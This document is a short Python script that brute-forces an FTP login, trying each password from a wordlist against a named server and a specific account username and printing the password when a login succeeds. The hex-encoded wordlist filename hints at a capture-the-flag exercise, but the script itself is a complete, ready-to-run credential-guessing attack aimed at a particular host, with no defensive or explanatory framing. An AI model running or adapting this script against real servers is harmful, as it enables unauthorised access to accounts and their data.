import ftplib

# FTP server details
server = 'mohammadlotfi.com'
username = 'u385686636.cybermo'
wordlist_path = '75706C6F6164732F323032332F3030302F666C61672E747874.txt'  # Update this to the path of your wordlist file

# Function to attempt FTP login
def try_login(password):
    try:
        ftp = ftplib.FTP(server)
        ftp.login(username, password)
        print(f"Success! Password is: {password}")
        ftp.quit()
        return True
    except ftplib.error_perm:
        print(f"Failed with password: {password}")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

# Main logic to read the wordlist and attempt logins
with open(wordlist_path, 'r') as wordlist:
    for password in wordlist:
        password = password.strip()  # Remove any trailing whitespace
        if try_login(password):
            print("Login successful, stopping...")
            break
